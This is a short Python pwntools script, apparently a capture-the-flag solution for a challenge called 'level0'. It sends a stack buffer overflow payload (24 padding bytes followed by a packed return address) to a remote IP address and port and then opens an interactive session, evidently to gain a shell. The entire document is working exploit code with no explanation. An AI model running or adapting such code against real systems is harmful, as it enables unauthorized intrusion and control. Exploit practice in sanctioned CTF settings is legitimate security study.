from pwn import *

junk = "A" * 0x18
payload = junk + p64(0x804850B)

# Io = zio.zio("./level0")
Io = remote("139.199.177.55",10001)

Io.send(payload)
Io.interactive()
